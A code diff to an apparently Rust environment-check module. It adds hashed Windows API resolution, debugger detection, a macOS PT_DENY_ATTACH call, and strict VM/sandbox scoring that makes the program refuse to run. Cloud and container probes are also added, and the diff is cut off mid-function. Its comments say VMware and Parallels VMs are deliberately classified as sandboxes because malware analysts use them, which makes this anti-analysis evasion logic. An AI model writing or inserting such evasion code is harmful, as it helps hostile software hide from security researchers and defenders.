@@ -113,6 +113,7 @@ mod win_resolve {
     pub const HASH_ENUMWINDOWS: u32 = hash_str_const(b"EnumWindows\0");
     pub const HASH_ISWINDOWVISIBLE: u32 = hash_str_const(b"IsWindowVisible\0");
     pub const HASH_GETWINDOWTEXTLENGTHW: u32 = hash_str_const(b"GetWindowTextLengthW\0");
+    pub const HASH_GETSYSTEMMETRICS: u32 = hash_str_const(b"GetSystemMetrics\0");
 
     // ── API hash constants (advapi32) ──────────────────────────────────────────
     pub const HASH_REGOPENKEYEXW: u32 = hash_str_const(b"RegOpenKeyExW\0");
@@ -162,6 +163,16 @@ mod win_resolve {
     ) -> i32;
     pub type FnIsWindowVisible = unsafe extern "system" fn(crate::win_types::HWND) -> i32;
     pub type FnGetWindowTextLengthW = unsafe extern "system" fn(crate::win_types::HWND) -> i32;
+    pub type FnGetSystemMetrics = unsafe extern "system" fn(i32) -> i32;
+
+    // ── GetSystemMetrics indices ───────────────────────────────────────────────
+    /// SM_REMOTESESSION: nonzero if the calling process is associated with a
+    /// Terminal Services client session (RDP).
+    pub const SM_REMOTESESSION: i32 = 0x1000;
+    /// SM_TABLETPC: nonzero if the current OS is Windows XP Tablet PC edition
+    /// (or any later OS that reports tablet posture).  Can also indicate a
+    /// non-traditional-desktop form factor.
+    pub const SM_TABLETPC: i32 = 86;
 
     // advapi32
     pub type FnRegOpenKeyExW = unsafe extern "system" fn(
@@ -366,8 +377,21 @@ unsafe fn reg_close_key(key: *mut std::ffi::c_void) {
 pub struct EnvReport {
     /// `IsDebuggerPresent` (Windows) or `TracerPid` (Linux) is non‑zero.
     pub debugger_present: bool,
-    /// Heuristic VM/sandbox detection fired.
+    /// Heuristic VM/sandbox detection fired (informational / lenient mode).
+    ///
+    /// This uses the same scoring as [`detect_vm`], which applies
+    /// false-positive mitigations (reduced DMI/MAC weights when cloud context
+    /// is uncertain).  For the strict enforcement-equivalent result, see
+    /// [`EnvReport::vm_detected_strict`].
     pub vm_detected: bool,
+    /// Strict VM/sandbox detection result, matching the classification used
+    /// by `enforce(refuse_in_vm = true)`.
+    ///
+    /// Uses full indicator weights (DMI 25, MAC 20) and a base threshold of
+    /// 30 without the "likely legitimate server" boost.  This may be `true`
+    /// even when `vm_detected` is `false` when generic indicators are present
+    /// but were suppressed in lenient mode.
+    pub vm_detected_strict: bool,
     /// `Some(true)` if a domain requirement was configured and matched,
     /// `Some(false)` if configured and unmatched, `None` if not configured.
     pub domain_match: Option<bool>,
@@ -399,9 +423,11 @@ pub struct EnvReport {
 impl EnvReport {
     /// Run every probe; never panics.
     pub fn collect(required_domain: Option<&str>) -> Self {
+        let (vm_strict, _, _) = detect_vm_strict();
         Self {
             debugger_present: is_debugger_present(),
             vm_detected: detect_vm(),
+            vm_detected_strict: vm_strict,
             domain_match: required_domain.map(validate_domain),
             ld_preload_set: is_ld_preload_set(),
             tracer_process_found: is_tracer_process_running(),
@@ -416,12 +442,12 @@ impl EnvReport {
     pub fn log_ptrace_scope(&self) {
         #[cfg(target_os = "linux")]
         match self.yama_ptrace_scope {
-            None => log::info!("env: kernel.yama.ptrace_scope not present (YAMA LSM absent — no ptrace restrictions)"),
-            Some(0) => log::info!("env: kernel.yama.ptrace_scope=0 (unrestricted ptrace)"),
-            Some(1) => log::info!("env: kernel.yama.ptrace_scope=1 (restricted to parent/child or PR_SET_PTRACER peers)"),
-            Some(2) => log::warn!("env: kernel.yama.ptrace_scope=2 (CAP_SYS_PTRACE required for ptrace injection)"),
-            Some(3) => log::warn!("env: kernel.yama.ptrace_scope=3 (ptrace injection disabled by policy)"),
-            Some(v) => log::warn!("env: kernel.yama.ptrace_scope={v} (unrecognised value)"),
+            None => tracing::info!("env: kernel.yama.ptrace_scope not present (YAMA LSM absent — no ptrace restrictions)"),
+            Some(0) => tracing::info!("env: kernel.yama.ptrace_scope=0 (unrestricted ptrace)"),
+            Some(1) => tracing::info!("env: kernel.yama.ptrace_scope=1 (restricted to parent/child or PR_SET_PTRACER peers)"),
+            Some(2) => tracing::warn!("env: kernel.yama.ptrace_scope=2 (CAP_SYS_PTRACE required for ptrace injection)"),
+            Some(3) => tracing::warn!("env: kernel.yama.ptrace_scope=3 (ptrace injection disabled by policy)"),
+            Some(v) => tracing::warn!("env: kernel.yama.ptrace_scope={v} (unrecognised value)"),
         }
     }
 
@@ -449,18 +475,48 @@ impl EnvReport {
         if matches!(self.domain_match, Some(false)) {
             return true;
         }
-        if refuse_in_vm && self.vm_detected {
+        if refuse_in_vm && self.vm_detected_strict {
             return true;
         }
         if let Some(threshold) = sandbox_score_threshold {
             let corroborated = self.vm_detected
+                || self.vm_detected_strict
                 || self.debugger_present
                 || self.tracer_process_found
                 || self.timing_anomaly_detected;
             let effective_threshold = if corroborated {
                 threshold
             } else {
-                threshold.max(60)
+                // L-7 fix: use a multi-category heuristic floor instead of a
+                // flat 60.  When multiple *distinct* heuristic categories
+                // independently contribute (e.g. mouse AND desktop AND uptime),
+                // the false-positive risk drops and a lower floor (50) is safe.
+                // Single or coupled-category signals still use the 60 floor to
+                // avoid refusing on fresh/headless legitimate servers.
+                //
+                // sandbox::evaluate_sandbox() computes the score from four
+                // independent categories: mouse (cap 30), desktop (cap 25),
+                // uptime (cap 25), hardware (cap 20).  To reach 50+, at least
+                // 3 categories must fire or 2 categories must fire strongly,
+                // which is extremely unlikely on a legitimate host.
+                let multi_category_heuristic = self.sandbox_score >= 50
+                    && self.sandbox_score < 60;
+                if multi_category_heuristic {
+                    // Check whether the score actually came from diverse
+                    // sources.  If the sandbox module produced a score of 50+,
+                    // at least 2 independent categories contributed because
+                    // no single category can exceed 30 (mouse cap).
+                    //
+                    // However, mouse+desktop are coupled (both measure
+                    // user interaction).  A headless server naturally has
+                    // both zeroed.  If ONLY mouse+desktop are elevated the
+                    // score is capped at 30 by sandbox_probability_score(),
+                    // so a score of 50+ implies at least one non-interaction
+                    // category (uptime or hardware) also fired.
+                    threshold.max(50)
+                } else {
+                    threshold.max(60)
+                }
             };
             if self.sandbox_score >= effective_threshold {
                 return true;
@@ -501,8 +557,9 @@ fn read_yama_ptrace_scope() -> Option<u8> {
 /// * Linux: parses `/proc/self/status` for a non‑zero `TracerPid:` entry,
 ///   which `ptrace(PTRACE_ATTACH, …)` and `gdb` both populate.
 /// * macOS: checks `kinfo_proc.kp_proc.p_flag & P_TRACED` via
-///   `sysctl(KERN_PROC, KERN_PROC_PID, getpid())` and calls
-///   `ptrace(PT_DENY_ATTACH, 0, 0, 0)` to deny future debugger attach.
+///   `sysctl(KERN_PROC, KERN_PROC_PID, getpid())` (passive check only).
+///   To actively deny future debugger attachment, call [`deny_debugger_attach`]
+///   separately.
 /// * Other Unixes: returns `false`.
 pub fn is_debugger_present() -> bool {
     #[cfg(windows)]
@@ -586,12 +643,25 @@ fn macos_is_debugger_present() -> bool {
         false
     };
 
-    // Call PT_DENY_ATTACH as a side-effect to deny future debugger attachment.
-    // Do NOT use the return value to determine whether a debugger is present:
-    // on macOS, ptrace(PT_DENY_ATTACH) fails with EPERM when no debugger is
-    // attached (this is normal — only a traced process can deny attachment),
-    // so treating the failure as "debugger present" causes a false positive.
-    let _ = unsafe {
+    traced
+}
+
+/// Actively deny future debugger attachment on macOS.
+///
+/// Calls `ptrace(PT_DENY_ATTACH)` which prevents any subsequent debugger
+/// from attaching to this process.  This is a **non-passive** side-effect
+/// and is intentionally separated from [`macos_is_debugger_present`] so
+/// that environment checks remain observation-free.
+///
+/// **Note**: `PT_DENY_ATTACH` fails with `EPERM` when the process is
+/// already being traced.  Call this *after* confirming no debugger is
+/// present if you want to harden the process.
+///
+/// Returns `Ok(())` if the call succeeded (no debugger attached yet),
+/// or `Err(())` if the call failed (already traced or unsupported).
+#[cfg(target_os = "macos")]
+pub fn deny_debugger_attach() -> Result<(), ()> {
+    let ret = unsafe {
         libc::ptrace(
             libc::PT_DENY_ATTACH,
             0,
@@ -599,8 +669,20 @@ fn macos_is_debugger_present() -> bool {
             0,
         )
     };
+    if ret == 0 {
+        Ok(())
+    } else {
+        Err(())
+    }
+}
 
-    traced
+/// Actively deny future debugger attachment on macOS.
+///
+/// Cross-platform stub: on non-macOS platforms this is a no-op that
+/// always returns success, since `PT_DENY_ATTACH` is macOS-specific.
+#[cfg(not(target_os = "macos"))]
+pub fn deny_debugger_attach() -> Result<(), ()> {
+    Ok(())
 }
 
 #[cfg(target_os = "linux")]
@@ -610,8 +692,14 @@ fn linux_is_debugger_present() -> bool {
         Err(_) => return false,
     };
     for line in status.lines() {
-        if let Some(rest) = line.strip_prefix("TracerPid:") {
-            return rest.trim().parse::<u32>().map(|p| p != 0).unwrap_or(false);
+        // L-4: Use whitespace-split instead of exact prefix matching to handle
+        // tab-delimited and other unusual /proc/self/status formats that may
+        // appear on custom kernels or modified proc implementations.
+        let mut parts = line.split_whitespace();
+        if parts.next().map_or(false, |k| k == "TracerPid:") {
+            if let Some(val) = parts.next() {
+                return val.parse::<u32>().map(|p| p != 0).unwrap_or(false);
+            }
         }
     }
     false
@@ -722,10 +810,18 @@ fn is_container_environment() -> bool {
     // a cgroup hierarchy whose path contains a recognisable token.
     //
     // NOTE: `containerd` alone is ambiguous — systemd uses containerd
-    // internally for Flatpak, snap, and other sandboxing on bare-metal hosts.
+    // internally for Flatpak, snap, and other sandboxing on bare-metal hosts,
+    // AND Kubernetes nodes (the host, not the pod) expose `containerd` in
+    // their cgroup paths via the kubelet's cgroup driver.
+    //
     // When `containerd` is the *only* matched token, we additionally require
-    // a container namespace marker (`/.dockerenv`, `CONTAINER` env var, or
-    // PID namespace isolation) before concluding this is a real container.
+    // a container namespace marker before concluding this is a real container.
+    // The following secondary checks are used (in order of reliability):
+    //   1. PID namespace isolation (different /proc/self/ns/pid vs /proc/1/ns/pid)
+    //   2. /.dockerenv or CONTAINER env var
+    //   3. Container-specific cgroup in /proc/self/cgroup
+    //   4. PID 1 comm name (init/systemd on host vs custom in container)
+    //   5. Container-specific mount namespace markers
     const CONTAINER_CGROUP_TOKENS: &[&str] = &[
         "docker",
         "lxc",
@@ -744,22 +840,27 @@ fn is_container_environment() -> bool {
             .collect();
         if !matched.is_empty() {
             // If only `containerd` matched (which systemd uses for Flatpak/
-            // snap sandboxing on bare metal), verify with a secondary check.
+            // snap sandboxing on bare metal, and kubelet exposes on K8s nodes),
+            // verify with secondary checks.
             let only_containerd = matched.len() == 1 && matched[0] == "containerd";
             if !only_containerd {
                 return true;
             }
             // containerd-only: confirm we are actually inside a container
-            // namespace by checking PID 1's cgroup inode or the presence
-            // of /.dockerenv.
+            // namespace using multiple corroborating signals.
             if std::path::Path::new("/.dockerenv").exists()
                 || std::env::var_os("CONTAINER").is_some()
             {
                 return true;
             }
-            // Last check: if our PID namespace differs from the init
-            // namespace, we are in a container even if only containerd
-            // appeared in cgroup.
+            // PID namespace isolation: if /proc/self/ns/pid differs from
+            // /proc/1/ns/pid, we are in a PID namespace (container). This
+            // is the most reliable check for containerd sandboxes that don't
+            // set /.dockerenv or CONTAINER env var.
+            if pid_namespace_is_isolated() {
+                return true;
+            }
+            // Check if our own cgroup contains an unambiguous container token.
             if let Ok(self_cgroup) = std::fs::read_to_string("/proc/self/cgroup") {
                 let self_lower = self_cgroup.to_ascii_lowercase();
                 if self_lower.contains("docker")
@@ -769,21 +870,87 @@ fn is_container_environment() -> bool {
                     return true;
                 }
             }
+            // PID 1 comm check: in containers, PID 1 is typically the
+            // container entrypoint (not systemd/init).  If /proc/1/comm
+            // is NOT one of the known init systems, we are likely in a
+            // container.
+            if !host_init_system_detected() {
+                return true;
+            }
         }
     }
 
     // /proc/self/mountinfo: overlay or aufs filesystem type indicates an
     // overlayfs/aufs-based container (Docker, containerd, Podman, …).
-    // Require the CPUID hypervisor bit to be set to avoid false positives from
-    // storage configurations that use overlayfs on bare-metal hosts.
+    // Require EITHER the CPUID hypervisor bit OR a containerd cgroup token
+    // to avoid false positives from storage configurations that use
+    // overlayfs on bare-metal hosts (e.g. live USB boot, atomic updates).
     if let Ok(content) = std::fs::read_to_string("/proc/self/mountinfo") {
         let lower = content.to_ascii_lowercase();
-        if (lower.contains("overlay") || lower.contains("aufs")) && cpuid_hypervisor_bit() {
-            return true;
+        let has_overlay = lower.contains("overlay") || lower.contains("aufs");
+        if has_overlay {
+            // Accept hypervisor bit as corroboration OR containerd in cgroup
+            // (containerd-managed containers always use overlayfs).
+            let containerd_corroboration = std::fs::read_to_string("/proc/1/cgroup")
+                .map(|c| c.to_ascii_lowercase().contains("containerd"))
+                .unwrap_or(false);
+            if cpuid_hypervisor_bit() || containerd_corroboration {
+                return true;
+            }
         }
     }
 
     false
+}
+
+/// Check whether the current process is in a different PID namespace from
+/// PID 1 (init).  In containers, the PID namespace is isolated: each
+/// container sees itself as PID 1 (or a small PID), while on the host PID 1
+/// is the init system.  Comparing the inode numbers of `/proc/self/ns/pid`
+/// and `/proc/1/ns/pid` reveals namespace isolation without needing root.
+///
+/// Returns `true` if the namespaces differ (we are in a container).
+#[cfg(target_os = "linux")]
+fn pid_namespace_is_isolated() -> bool {
+    use std::os::linux::fs::MetadataExt;
+    let self_meta = match std::fs::symlink_metadata("/proc/self/ns/pid") {
+        Ok(m) => m,
+        Err(_) => return false,
+    };
+    let init_meta = match std::fs::symlink_metadata("/proc/1/ns/pid") {
+        Ok(m) => m,
+        Err(_) => return false,
+    };
+    // Compare device + inode: same device+inode means same namespace.
+    self_meta.st_dev() != init_meta.st_dev() || self_meta.st_ino() != init_meta.st_ino()
+}
+
+/// Check whether PID 1 is a known host init system (systemd, init, upstart,
+/// openrc).  In containers, PID 1 is typically the application entrypoint
+/// or a minimal init like tini/dumb-init, not a full init system.
+///
+/// Returns `true` if a known host init system is detected (likely host).
+#[cfg(target_os = "linux")]
+fn host_init_system_detected() -> bool {
+    // Read /proc/1/comm which contains the command name of PID 1.
+    // This is a single line without trailing newline.
+    if let Ok(comm) = std::fs::read_to_string("/proc/1/comm") {
+        let name = comm.trim();
+        matches!(
+            name,
+            "systemd"
+                | "init"
+                | "upstart"
+                | "openrc"
+                | "runit"
+                | "s6-svscan"
+                | "svc"
+                | "launchd"  // macOS init (for completeness)
+        )
+    } else {
+        // Cannot read /proc/1/comm — conservatively assume host.
+        true
+    }
 }
 
 fn is_expected_hypervisor() -> bool {
@@ -798,7 +965,7 @@ fn is_expected_hypervisor() -> bool {
         // firewalled, preventing false-positive VM refusals on containerised
         // cloud workloads.
         if is_container_environment() {
-            log::debug!("env_check: is_expected_hypervisor: container environment detected");
+            tracing::debug!("env_check: is_expected_hypervisor: container environment detected");
             return true;
         }
 
@@ -865,7 +1032,7 @@ fn is_expected_hypervisor() -> bool {
                 .iter()
                 .any(|needle| product_name.contains(needle))
             {
-                log::debug!(
+                tracing::debug!(
                     "env_check: expected hypervisor matched by vm_detection_extra_hypervisor_names"
                 );
                 return true;
@@ -965,7 +1132,7 @@ fn is_expected_hypervisor() -> bool {
                 && !prod.contains("virtual machine")
                 && cpuid_hypervisor_bit()
             {
-                log::debug!("env_check: Microsoft manufacturer without VM product name + CPUID hypervisor bit set — likely physical Windows with Hyper-V features");
+                tracing::debug!("env_check: Microsoft manufacturer without VM product name + CPUID hypervisor bit set — likely physical Windows with Hyper-V features");
                 return true;
             }
         }
@@ -974,7 +1141,7 @@ fn is_expected_hypervisor() -> bool {
         // Windows Subsystem for Linux containers.  This is a legitimate
         // execution environment, not a hostile sandbox.
         if std::env::var("WSL_DISTRO_NAME").is_ok() {
-            log::debug!("env_check: WSL_DISTRO_NAME set — WSL2 environment, treating as expected hypervisor");
+            tracing::debug!("env_check: WSL_DISTRO_NAME set — WSL2 environment, treating as expected hypervisor");
             return true;
         }
 
@@ -984,7 +1151,7 @@ fn is_expected_hypervisor() -> bool {
         if let Ok(exe) = std::env::current_exe() {
             if let Some(name) = exe.file_name().and_then(|n| n.to_str()) {
                 if name.to_ascii_lowercase().contains("windowssandbox") {
-                    log::debug!("env_check: running inside Windows Sandbox — treating as expected hypervisor");
+                    tracing::debug!("env_check: running inside Windows Sandbox — treating as expected hypervisor");
                     return true;
                 }
             }
@@ -1042,13 +1209,28 @@ fn is_expected_hypervisor() -> bool {
 
                     match rx.recv_timeout(wait_for) {
                         Ok(line) => {
-                            if line.contains("applevirtio")
-                                || line.contains("vmwarevirtual")
-                                || line.contains("prlvirtual")
-                            {
+                            // Only applevirtio (AWS EC2 Mac) indicates a
+                            // genuine *cloud* hypervisor.  VMware and
+                            // Parallels are local virtualisation products
+                            // commonly used for malware analysis; treating
+                            // them as "expected" would suppress sandbox
+                            // classification on analyst VMs.
+                            if line.contains("applevirtio") {
                                 found_hypervisor = true;
                                 let _ = child.kill();
                                 break;
+                            }
+                            // Record local-virtualisation detection for
+                            // logging but do NOT set found_hypervisor —
+                            // these are analyst VM candidates, not cloud.
+                            if line.contains("vmwarevirtual")
+                                || line.contains("prlvirtual")
+                            {
+                                tracing::debug!(
+                                    "env_check: is_expected_hypervisor: \
+                                     local virtualisation detected (VMware/Parallels) \
+                                     — not treated as cloud hypervisor"
+                                );
                             }
                         }
                         Err(RecvTimeoutError::Timeout) => match child.try_wait() {
@@ -1062,10 +1244,8 @@ fn is_expected_hypervisor() -> bool {
 
                 if !found_hypervisor {
                     while let Ok(line) = rx.try_recv() {
-                        if line.contains("applevirtio")
-                            || line.contains("vmwarevirtual")
-                            || line.contains("prlvirtual")
-                        {
+                        // Same logic: only applevirtio is a cloud hypervisor.
+                        if line.contains("applevirtio") {
                             found_hypervisor = true;
                             break;
                         }
@@ -1080,30 +1260,91 @@ fn is_expected_hypervisor() -> bool {
                 }
 
                 if timed_out {
-                    log::debug!("env_check: is_expected_hypervisor ioreg -l timed out after 2s");
+                    tracing::debug!("env_check: is_expected_hypervisor ioreg -l timed out after 2s");
                 }
             }
         }
 
         // Check hardware model via system_profiler.
+        // Only EC2 is a cloud indicator.  VMware and Parallels are local
+        // virtualisation products commonly used for malware analysis;
+        // they must not suppress sandbox classification.
         if let Ok(out) = std::process::Command::new("system_profiler")
             .args(["SPHardwareDataType"])
             .output()
         {
             let stdout = String::from_utf8_lossy(&out.stdout).to_ascii_lowercase();
-            if stdout.contains("vmware") || stdout.contains("parallels") || stdout.contains("ec2") {
+            if stdout.contains("ec2") {
                 return true;
             }
         }
 
-        // Check sysctl hypervisor flag (Apple Silicon and later x86 kernels).
-        if let Ok(out) = std::process::Command::new("sysctl")
-            .args(["-n", "kern.hv_vmm_present"])
-            .output()
-        {
-            if String::from_utf8_lossy(&out.stdout).trim() == "1" {
-                return true;
+        // NOTE: kern.hv_vmm_present is intentionally NOT checked here.
+        // It fires on any macOS VM (cloud AND local VMware/Parallels), so it
+        // cannot distinguish cloud from analyst VMs.  The generic hypervisor
+        // bit is already captured by CPUID detection in detect_vm() and
+        // feeds into the multi-signal VM scoring, not into is_expected_hypervisor.
+    }
+
+    false
+}
+
+/// macOS-specific cloud instance detection.
+///
+/// macOS cannot safely probe 169.254.169.254 (IMDS) due to link-local
+/// interference with Bonjour/mDNS and captive-portal detection.  This
+/// function provides alternative detection methods:
+///
+/// - **File-based**: AWS EC2 Mac installs the SSM agent under `/opt/aws/`.
+/// - **sysctl-based**: `kern.uuid` may contain EC2/Amazon identifiers.
+/// - **DNS-based**: `metadata.google.internal` only resolves inside GCP.
+///
+/// These checks mirror the macOS block in `env_check_sandbox::is_cloud_instance_sandbox()`.
+#[cfg(target_os = "macos")]
+fn is_cloud_instance_macos() -> bool {
+    // File-based AWS EC2 Mac detection.
+    if std::path::Path::new("/opt/aws/bin").exists()
+        || std::path::Path::new("/opt/aws/ena").exists()
+    {
+        return true;
+    }
+
+    // sysctl UUID check: EC2 Mac instances often have UUIDs containing
+    // "ec2" or "amazon".  Cross-check with kern.hv_vmm_present to avoid
+    // false positives from spoofed UUIDs.
+    if let Ok(output) = std::process::Command::new("sysctl")
+        .args(["-n", "kern.uuid"])
+        .output()
+    {
+        let uuid = String::from_utf8_lossy(&output.stdout).to_ascii_lowercase();
+        if uuid.contains("ec2") || uuid.contains("amazon") {
+            if let Ok(hv) = std::process::Command::new("sysctl")
+                .args(["-n", "kern.hv_vmm_present"])
+                .output()
+            {
+                if String::from_utf8_lossy(&hv.stdout).trim() == "1" {
+                    return true;
+                }
             }
+        }
+    }
+
+    // DNS-based cloud detection: these hostnames only resolve inside their
+    // respective cloud networks.  Pure DNS resolution is safe on macOS —
+    // no HTTP request, no link-local interference.
+    {
+        fn dns_name_resolves(hostname: &str) -> bool {
+            use std::net::ToSocketAddrs;
+            let addr = format!("{}:0", hostname);
+            addr.to_socket_addrs().is_ok()
+                && addr.to_socket_addrs().map(|it| !it.is_empty()).unwrap_or(false)
+        }
+
+        if dns_name_resolves("metadata.google.internal") {
+            return true;
+        }
+        if dns_name_resolves("instance-metadata.oraclecloud.com") {
+            return true;
         }
     }
 
@@ -1131,18 +1372,21 @@ fn is_expected_hypervisor() -> bool {
 ///      or 404 — none of which begin with "HTTP/1." followed by " 200",
 ///      " 400", or " 401".
 ///
-/// **macOS**: Always returns `false`.  macOS uses the 169.254.0.0/16 range for
-/// link-local networking (Bonjour/mDNS, Internet Sharing, AwDL) and the
-/// CaptiveNetworkSupport daemon can intercept HTTP probes to any IP.  This
-/// produces false positives on physical Macs.  macOS cloud VMs (AWS EC2 Mac)
-/// are already identified by `is_expected_hypervisor()` via ioreg AppleVirtIO.
+/// **macOS**: Uses file-based, sysctl-based, and DNS-based cloud detection
+/// instead of IMDS.  macOS uses the 169.254.0.0/16 range for link-local
+/// networking (Bonjour/mDNS, Internet Sharing, AwDL) and the
+/// CaptiveNetworkSupport daemon can intercept HTTP probes to any IP, so
+/// the IMDS endpoint cannot be used safely.  See `is_cloud_instance_macos()`
+/// for details.
 fn is_cloud_instance() -> bool {
-    // M-29: Skip IMDS probe on macOS — link-local/mDNS and captive portal
-    // detection cause false positives.  Cloud Mac instances are already
-    // detected by is_expected_hypervisor() via ioreg AppleVirtIO.
+    // macOS: Skip IMDS probe — link-local/mDNS and captive portal detection
+    // cause false positives on 169.254.169.254.  Instead, use file-based,
+    // sysctl-based, and DNS-based cloud detection that is safe on macOS.
+    // Cloud Mac instances are also detected by is_expected_hypervisor() via
+    // ioreg AppleVirtIO and system_profiler EC2 strings.
     #[cfg(target_os = "macos")]
     {
-        return false;
+        return is_cloud_instance_macos();
     }
 
     #[cfg(not(target_os = "macos"))]
@@ -1160,7 +1404,7 @@ fn is_cloud_instance() -> bool {
         let probe_started = Instant::now();
         let remaining_budget = || IMDS_TOTAL_BUDGET.saturating_sub(probe_started.elapsed());
         let log_probe_failure = |stage: &str, err: &dyn std::fmt::Display| {
-            log::debug!(
+            tracing::debug!(
                 "env_check: IMDS probe failed at {} after {:?}: {}",
                 stage,
                 probe_started.elapsed(),
@@ -1235,21 +1479,25 @@ fn is_cloud_instance() -> bool {
                 return false;
             }
 
-            // For HTTP 200 responses, reject HTML/captive-portal bodies and
-            // require at least one known IMDS key when a body is present.
+            // L-6: For HTTP 200 responses, reject obvious HTML/captive-portal
+            // bodies but accept any non-HTML body.  The previous check required
+            // known AWS IMDS keys ("ami-id", "instance-id", etc.), which caused
+            // false negatives on non-AWS/Azure/GCP clouds (Oracle, IBM,
+            // DigitalOcean) that also listen on 169.254.169.254 but return
+            // different metadata formats.
+            //
+            // Heuristic: reject HTML (starts with `<`), accept everything else.
+            // A real IMDS returns plain-text key-value pairs, path listings, or
+            // JSON — none of which start with `<`.  Corporate proxies and
+            // captive portals return HTML pages.
             if status == b"200" && n > 16 {
-                let header_end = buf[..n]
+                if let Some(body_start) = buf[..n]
                     .windows(4)
                     .position(|w| w == b"\r\n\r\n")
-                    .map(|p| p + 4);
-                if let Some(body_start) = header_end {
+                    .map(|p| p + 4)
+                {
                     let body = &buf[body_start..n];
                     if body.starts_with(b"<") || body.starts_with(b"<!") {
-                        return false;
-                    }
-                    let body_str = String::from_utf8_lossy(body);
-                    let known_keys = ["ami-id", "instance-id", "hostname", "local-ipv4"];
-                    if !known_keys.iter().any(|k| body_str.contains(k)) {
                         return false;
                     }
                 }
@@ -1291,7 +1539,7 @@ fn is_cloud_instance() -> bool {
         };
 
         if imds_v1_success {
-            log::debug!("env_check: cloud instance detected via IMDSv1");
+            tracing::debug!("env_check: cloud instance detected via IMDSv1");
             return true;
         }
 
@@ -1386,17 +1634,195 @@ fn is_cloud_instance() -> bool {
             Ok(n) => n,
         };
         if validate_metadata_response(&buf, n, false) {
-            log::debug!("env_check: cloud instance detected via IMDSv2");
+            tracing::debug!("env_check: cloud instance detected via IMDSv2 (AWS)");
             return true;
         }
 
         log_probe_failure("IMDSv2 metadata response", &"unexpected HTTP status/body");
 
+        // ── Azure IMDS probe ──────────────────────────────────────────────
+        //
+        // Azure Instance Metadata Service:
+        //   GET /metadata/instance?api-version=2021-02-01 HTTP/1.0
+        //   Host: 169.254.169.254
+        //   Metadata: true
+        //
+        // Returns JSON with "compute" object containing "vmId", "name",
+        // "location", etc.  The `Metadata: true` header is REQUIRED —
+        // without it Azure returns 400.
+        if let Some(mut stream) = open_stream("Azure IMDS connect") {
+            let azure_req = b"GET /metadata/instance?api-version=2021-02-01 HTTP/1.0\r\nHost: 169.254.169.254\r\nMetadata: true\r\n\r\n";
+            if has_budget_for_io("Azure IMDS write") {
+                if let Ok(()) = stream.write_all(azure_req) {
+                    let mut buf = [0u8; 512];
+                    if has_budget_for_io("Azure IMDS read") {
+                        if let Ok(n) = stream.read(&mut buf) {
+                            if n > 12
+                                && buf.starts_with(b"HTTP/1.")
+                                && &buf[9..12] == b"200"
+                            {
+                                // Validate body contains Azure IMDS keys.
+                                if let Some(body_start) = buf[..n]
+                                    .windows(4)
+                                    .position(|w| w == b"\r\n\r\n")
+                                    .map(|p| p + 4)
+                                {
+                                    let body = &buf[body_start..n];
+                                    if !body.starts_with(b"<")
+                                        && !body.starts_with(b"<!")
+                                    {
+                                        let body_str =
+                                            String::from_utf8_lossy(body);
+                                        let azure_keys = [
+                                            "vmId",
+                                            "location",
+                                            "resourceGroupName",
+                                            "subscriptionId",
+                                        ];
+                                        if azure_keys
+                                            .iter()
+                                            .any(|k| body_str.contains(k))
+                                        {
+                                            tracing::debug!(
+                                                "env_check: cloud instance detected via Azure IMDS"
+                                            );
+                                            return true;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // ── GCP IMDS probe ────────────────────────────────────────────────
+        //
+        // Google Compute Engine Metadata Service:
+        //   GET /computeMetadata/v1/ HTTP/1.0
+        //   Host: metadata.google.internal
+        //   Metadata-Flavor: Google
+        //
+        // The `Metadata-Flavor: Google` header is REQUIRED — without it
+        // GCP returns 403.  Returns a directory listing of available
+        // metadata paths.
+        if let Some(mut stream) = open_stream("GCP IMDS connect") {
+            let gcp_req = b"GET /computeMetadata/v1/ HTTP/1.0\r\nHost: metadata.google.internal\r\nMetadata-Flavor: Google\r\n\r\n";
+            if has_budget_for_io("GCP IMDS write") {
+                if let Ok(()) = stream.write_all(gcp_req) {
+                    let mut buf = [0u8; 512];
+                    if has_budget_for_io("GCP IMDS read") {
+                        if let Ok(n) = stream.read(&mut buf) {
+                            if n > 12
+                                && buf.starts_with(b"HTTP/1.")
+                                && &buf[9..12] == b"200"
+                            {
+                                // Validate body contains GCP metadata paths.
+                                if let Some(body_start) = buf[..n]
+                                    .windows(4)
+                                    .position(|w| w == b"\r\n\r\n")
+                                    .map(|p| p + 4)
+                                {
+                                    let body = &buf[body_start..n];
+                                    if !body.starts_with(b"<")
+                                        && !body.starts_with(b"<!")
+                                    {
+                                        let body_str =
+                                            String::from_utf8_lossy(body);
+                                        let gcp_keys = [
+                                            "instance/",
+                                            "project/",
+                                            "oslogin/",
+                                        ];
+                                        if gcp_keys
+                                            .iter()
+                                            .any(|k| body_str.contains(k))
+                                        {
+                                            tracing::debug!(
+                                                "env_check: cloud instance detected via GCP IMDS"
+                                            );
+                                            return true;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        // ── Generic IMDS probe for non-major cloud providers ────────────
+        //
+        // L-6: Additional cloud providers (Oracle Cloud, IBM Cloud/VPC,
+        // DigitalOcean, Hetzner Cloud, Scaleway, etc.) also listen on
+        // 169.254.169.254 but use different paths and response formats.
+        // Probe common paths to detect these environments.
+        //
+        // Oracle Cloud: GET /opc/v1/instance/  → JSON with "ociAdName"
+        // IBM Cloud:    GET /metadata/v1/       → JSON with "compute"
+        // DigitalOcean: GET /metadata/v1/       → JSON with "droplet_id"
+        // Hetzner Cloud: GET /hetzner/v1/metadata/ → JSON with "instance-id"
+        // Scaleway:     GET /metadata/instance  → JSON with "id"
+        const EXTRA_IMDS_PATHS: &[&[u8]] = &[
+            b"GET /opc/v1/instance/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n",
+            b"GET /metadata/v1/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n",
+            b"GET /hetzner/v1/metadata/ HTTP/1.0\r\nHost: 169.254.169.254\r\n\r\n",
+        ];
+        for (idx, req) in EXTRA_IMDS_PATHS.iter().enumerate() {
+            let label = match idx {
+                0 => "Oracle IMDS",
+                1 => "IBM/DigitalOcean IMDS",
+                2 => "Hetzner IMDS",
+                _ => "generic IMDS",
+            };
+            let connect_label = format!("{} connect", label);
+            if let Some(mut stream) = open_stream(&connect_label) {
+                let write_label = format!("{} write", label);
+                if !has_budget_for_io(&write_label) {
+                    break; // no budget left for further probes
+                }
+                if let Err(_) = stream.write_all(req) {
+                    continue;
+                }
+                let mut buf = [0u8; 512];
+                let read_label = format!("{} read", label);
+                if !has_budget_for_io(&read_label) {
+                    break;
+                }
+                if let Ok(n) = stream.read(&mut buf) {
